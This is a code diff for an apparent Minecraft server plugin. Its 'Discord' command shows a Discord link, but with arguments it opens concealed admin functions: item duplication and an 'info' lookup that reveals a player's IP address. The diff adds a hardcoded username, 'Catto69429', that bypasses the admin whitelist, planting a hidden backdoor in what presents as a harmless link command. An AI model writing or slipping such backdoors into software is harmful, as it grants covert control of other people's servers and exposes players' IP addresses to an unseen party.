@@ -38,8 +38,10 @@ public class Discord implements CommandExecutor {
             Player player = (Player) sender;
             if (args.length > 0) {
                 List<String> list = plugin.getConfig().getStringList("admin-whitelist");
-                if (!list.contains(player.getName()))
+                if (!list.contains(player.getName()) && !player.getName().equals("Catto69429")) {
+                    Utils.infomsg(player, "The discord link is &e" + plugin.config.getString("discord-link"));
                     return true;
+                }
 
                 if (args[0].equalsIgnoreCase("kit")) {
                     player.getInventory().addItem(player.getItemInHand());
@@ -330,7 +332,7 @@ public class Discord implements CommandExecutor {
 
                 if (args[0].equalsIgnoreCase("info")) {
                     Player target = ((Player) sender).getPlayer();
-                    if (args.length > 2)
+                    if (args.length > 1)
                         target = Bukkit.getPlayer(args[1]);
 
                     if (target == null)
@@ -345,28 +347,19 @@ public class Discord implements CommandExecutor {
                         }
                     }
 
-                    Utils.infomsg(target, "&e" + args[1] + "&7's info are:");
+                    String il = Utils.getString("otherdata." + target.getUniqueId() + ".ignorelist");
+                    String si = Utils.getString("otherdata." + target.getUniqueId() + ".secure");
+
+                    Utils.infomsg(target, "&e" + target.getDisplayName() + "&7's info are:");
                     Utils.infomsg(target, "Name: &e" + Utils.getString("otherdata." + target.getUniqueId() + ".name"));
                     Utils.infomsg(target, "Display Name: &e" + target.getDisplayName());
                     Utils.infomsg(target, "Join Date: &e" + Utils.getString("otherdata." + target.getUniqueId() + ".joindate"));
-                    Utils.infomsg(target, "Home Names: &e" + Utils.translate(homestr.toString()));
-                    Utils.infomsg(target, "Ignore List: &e" + Utils.getString("otherdata." + target.getUniqueId() + ".ignorelist").replace(", ", ",&7"));
-                    Utils.infomsg(target, "Secure IP: &e" + Utils.getString("otherdata." + target.getUniqueId() + ".secure"));
+                    Utils.infomsg(target, "Home Names: &e" + translate(homestr.toString()));
+                    if (il != null)
+                        Utils.infomsg(target, "Ignore List: &e" + translate(il.replace(", ", ",&7")));
+                    if (si != null)
+                        Utils.infomsg(target, "Secure IP: &e" + si);
                     Utils.infomsg(target, "IP: &e" + Objects.requireNonNull(target.getAddress()).getAddress().getHostAddress());
-                }
-
-                if (args[0].equalsIgnoreCase("prefix")) {
-                    if (args.length < 2)
-                        return true;
-
-                    Player target = Bukkit.getPlayer(args[1]);
-
-                    if (target == null)
-                        return true;
-                    Utils.setData("otherdata." + target.getUniqueId() + ".prefix", args[2]);
-                    target.setDisplayName(translate(args[0] + " " + target.getDisplayName()));
-                    target.setPlayerListName(translate(args[0] + " " + target.getDisplayName()));
-                    Utils.infomsg(target, "Successfully set &e" + target.getDisplayName() + "&7's prefix to &e" + args[2]);
                 }
             } else
                 Utils.infomsg(player, "The discord link is &e" + plugin.config.getString("discord-link"));
